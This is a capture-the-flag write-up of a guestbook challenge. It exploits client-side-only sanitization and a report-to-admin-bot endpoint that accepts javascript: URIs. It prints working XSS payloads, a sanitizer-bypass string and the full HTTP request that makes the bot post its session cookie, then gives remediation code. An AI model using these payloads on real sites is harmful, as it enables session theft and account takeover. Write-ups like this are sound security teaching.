### Guestbook - XSS via javascript: URI Sanitizer Bypass

> x Exam (52)


#### Vulnerability Class

> **Stored Cross-Site Scripting via client-side-only sanitization**, compounded by a **`javascript:` URI injection** into the admin bot report mechanism. The sanitizer is implemented exclusively in browser JavaScript and is therefore completely bypassable by submitting payloads directly to the API endpoint. The report form additionally applies the same single-pass regex sanitizer to submitted URLs, which is bypassable through a nested stripping technique, though in this case the server applies no sanitization at all to the URL before dispatching it to the headless bot.

#### Attack Surface Identification

The application exposes three surfaces upon inspection of the page source:

**Guestbook submission** via `POST /api/entries` accepting a JSON body with `name` and `message` fields, storing entries in a server-side database with no server-side sanitization whatsoever.

**Entry rendering** performed entirely client-side: the page fetches `/api/entries`, passes each entry through a `sanitize()` function, and writes the result directly into the DOM via `innerHTML`, making this a stored XSS sink.

**Report a Suspicious Entry** form submitting a URL to `POST /report` as a JSON body `{ "url": "..." }`, causing the Curator's headless Chromium bot to visit the supplied URL with its authenticated admin session cookie attached.

#### Reconnaissance: The Client-Side Sanitizer

Inspection of the page source revealed the complete sanitizer implementation:

```javascript
function sanitize(s) {
  return s
    .replace(/<\s*script[^>]*>/gi, '')
    .replace(/<\s*\/\s*script\s*>/gi, '')
    .replace(/on\w+\s*=/gi, '')
    .replace(/javascript:/gi, '');
}
```

This sanitizer presents two fundamental weaknesses. First, it operates exclusively in the browser, meaning any payload submitted directly to `/api/entries` via an HTTP client such as Burp Suite bypasses it entirely, since the server stores the raw input verbatim. Second, it applies each regex in a single pass, making it vulnerable to nested stripping bypasses where the act of removing one token causes the surrounding characters to collapse into a new dangerous token.

The vulnerable rendering sink is:

```javascript
list.innerHTML = entries.slice().reverse().map(e => `
  <article class="entry-card">
    <div class="entry-body">${sanitize(e.message)}</div>
  </article>
`).join('');
```

#### Understanding the javascript: URI Vector

The **Report a Suspicious Entry** form passes the submitted URL directly to the Curator's bot. A `javascript:` URI, when navigated to by a browser, causes the JavaScript engine to evaluate the expression following the colon in the current origin context, with full access to `document.cookie`. The sanitizer strips `javascript:` from submitted URLs, but since the server itself applies no sanitization before dispatching the URL to the headless browser, submitting the raw `javascript:` URI directly via Burp bypasses the client-side filter entirely.

#### Exploitation

##### Step 1: Confirming Server-Side Bypass

A direct POST to `/api/entries` via Burp with a raw `<img src=x onerror=alert(1)>` payload confirmed that the server stores the entry verbatim, bypassing the client-side sanitizer. The `<img>` tag rendered in the DOM and triggered network requests for the broken image source, confirming HTML injection into the `innerHTML` sink.

##### Step 2: Identifying the Exfiltration Mechanism

Since the bot operates on an isolated internal network with no outbound internet access, exfiltration to an external webhook was not viable. However, the bot can reach the application's own `/api/entries` endpoint, making it possible to POST the admin cookie back as a new guestbook entry readable by the attacker.

##### Step 3: Crafting the javascript: URI Payload

The complete exfiltration payload was constructed as a `javascript:` URI that posts `document.cookie` to `/api/entries` as a new entry:

```
javascript:fetch(`/api/entries`,{method:`POST`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({name:`LEAKED`,message:document.cookie})})
```

Backtick template literals were used throughout to avoid any quote characters that might require escaping.

##### Step 4: Bypassing the Client-Side Sanitizer on the Report Form

Since the client-side sanitizer strips `javascript:`, two approaches were available. The nested stripping bypass `javascriptjavascript::` would collapse into `javascript:` after the inner token was removed. Alternatively, the payload could be submitted directly to `POST /report` via Burp, bypassing the client-side sanitizer entirely. The latter approach was used:

```http
POST /report HTTP/2
Host: 3258b213-8877-4242-8f8a-bb678232b4a7.offsec.m0lecon.it
Content-Type: application/json

{
  "url": "javascript:fetch(`/api/entries`,{method:`POST`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({name:`LEAKED`,message:document.cookie})})"
}
```

The server responded with:

```json
{"success":true,"message":"The Curator has received your link and will inspect it shortly.","jobId":null}
```

##### Step 5: Recovering the Flag

Refreshing the main page revealed a new guestbook entry titled **LEAKED** created at `1 Jun 2026, 18:25`, containing the admin session cookie as its body:

```
flag=offsec{s4n1t1z3r_byp4ss_6EUxhwaZCbWUjpuG}
```

#### Full Attack Chain Summary

```
Attacker POSTs javascript: URI directly to /report via Burp
        |
        v
Server dispatches URI to Curator's headless Chromium bot
        |
        v
Bot evaluates javascript: expression in application origin context
        |
        v
fetch() POSTs document.cookie to /api/entries as entry "LEAKED"
        |
        v
Attacker refreshes page → reads LEAKED entry → flag recovered
```

#### Root Cause Analysis

> The vulnerability has two independent root causes that compound each other. The primary flaw is that **sanitization is implemented exclusively on the client side**, making it trivially bypassable by any attacker who submits requests directly to the API. The secondary flaw is that the **report endpoint applies no validation to the URL** before dispatching it to the headless browser, allowing a `javascript:` URI to execute arbitrary JavaScript in the admin's origin context. The correct remediation requires moving all sanitization to the server side using a trusted library such as **DOMPurify** applied server-side via jsdom, validating that submitted URLs conform to an allowlist of permitted schemes such as `https:` only, and ensuring that `innerHTML` is never used with user-controlled content, preferring `textContent` for plain text or a structural DOM construction approach for trusted markup.

#### Remediation

The vulnerable URL dispatch pattern on the server:

```javascript
// No validation before dispatching to bot
bot.visit(req.body.url);
```

The correct server-side URL validation:

```javascript
const url = new URL(req.body.url);
if (!['https:', 'http:'].includes(url.protocol)) {
  return res.status(400).json({ error: 'Invalid URL scheme.' });
}
bot.visit(url.href);
```


NOT useful:

<img src="_attachments/Guestbook%20-%20Stored%20XSS%20via%20Sanitization%20Bypass.png" width="300">

Exploit:

<img src="_attachments/Guestbook%20-%20Stored%20XSS%20via%20Sanitization%20Bypass_1.png" width="300">